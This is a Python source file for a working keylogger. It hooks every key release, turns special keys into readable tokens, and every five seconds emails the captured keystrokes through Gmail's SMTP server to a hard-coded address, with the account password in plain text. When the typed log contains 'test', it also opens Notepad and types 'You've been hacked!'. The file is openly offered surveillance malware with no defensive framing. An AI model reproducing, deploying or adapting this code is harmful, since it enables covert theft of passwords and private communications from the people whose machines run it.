import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from time import sleep
import pyautogui

SEND_REPORT_INTERVAL = 5
EMAIL = "keyloggerlogs145@gmail.com"
PASSWORD = "keylogger123"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    # Log key when pressed
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
        self.check_commands(self.log.lower())

    # Send logged keys via email
    def send_mail(self, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # starts server in TLS mode
        server.starttls()
        # logs into email
        server.login(EMAIL, PASSWORD)
        # send message
        server.sendmail(EMAIL, EMAIL, message)
        # end session
        server.quit()
    
    # Save key log and reset timer
    def report(self):
        if self.log:
            
            self.send_mail(self.log)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # sets timer to daemon (dies when main thread dies)
        timer.daemon = True
        # start timer
        timer.start()

    def start(self):
        # start keyloggerbasicbasicbasic
        keyboard.on_release(callback=self.callback)
        # start reporting keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed test
        keyboard.wait()

    def check_commands(self, string):
        if string.find("test") != -1:
            pyautogui.hotkey("winleft", "m")
            pyautogui.press("winleft")
            pyautogui.write("notepad")
            pyautogui.press("enter")
            sleep(0.5)
            pyautogui.write("You've been hacked!")
            self.log = ""


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_INTERVAL)
    keylogger.start()